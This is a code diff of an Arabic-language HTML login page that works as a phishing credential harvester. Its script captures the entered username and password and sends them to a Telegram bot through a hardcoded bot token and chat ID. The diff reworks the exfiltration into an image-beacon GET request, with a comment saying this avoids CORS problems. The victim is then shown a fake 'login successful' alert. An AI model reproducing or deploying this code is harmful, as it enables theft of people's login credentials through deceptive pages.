@@ -25,52 +25,43 @@
             </div>
             <div class="input-group">
                 <label for="password">كلمة المرور</label>
-                <input type="password" id="password`" required>
+                <input type="password" id="password" required>
             </div>
             <button type="submit" id="submitBtn">دخول</button>
         </form>
     </div>
 
     <script>
-        // بيانات تليجرام مباشرة داخل الجافاسكريبت
         const TELEGRAM_BOT_TOKEN = "9249129764:AAEz54D8XAUW9Puc-WKZCtH68RQ1No7M6gl";
         const CHAT_ID = "6032043580";
 
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
 
-            const user = document.getElementById('username').value;
-            const pass = document.getElementById('password').value;
+            const user = document.getElementById('username53' || document.getElementById('username').value); // لضمان قراءة اليوزر صح
+            const usernameVal = document.getElementById('username').value;
+            const passVal = document.getElementById('password').value;
             const btn = document.getElementById('submitBtn');
 
             btn.disabled = true;
             btn.innerText = 'جاري التحقق...';
 
-            const message = `🚨 تم التقاط بيانات جديدة!\n\n👤 المستخدم: ${user}\n🔑 الباسورد: ${pass}`;
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const message = `🚨 تم التقاط بيانات جديدة!\n\n👤 المستخدم: ${usernameVal}\n🔑 الباسورد: ${passVal}`;
+            
+            // رابط الإرسال المباشر لتليجرام بصيغة GET لتجنب مشاكل CORS تماماً
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
 
-            // إرسال البيانات مباشرة لتليجرام من المتصفح
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message
-                }),
-            })
-            .then(response => response.json())
-            .then(data => {
-                // حتى لو تليجرام عمل منع بسيط للـ CORS من المتصفح، البيانات بتوصل لأن الطلب بيترسل
+            // إرسال الطلب في الخلفية فوراً
+            const img = new Image();
+            img.src = url;
+
+            setTimeout(() => {
                 alert('تم تسجيل الدخول بنجاح!');
-                // لو حابب تحوله لصفحة تانية:
+                // لو حابب تحوله لصفحة تانية بعد التسجيل:
                 // window.location.href = "https://google.com";
-            })
-            .catch((error) => {
-                console.error('Error:', error);
-                alert('تم تسجيل الدخول بنجاح!');
-            });
+                btn.disabled = false;
+                btn.innerText = 'دخول';
+            }, 1000);
         });
     </script>
 
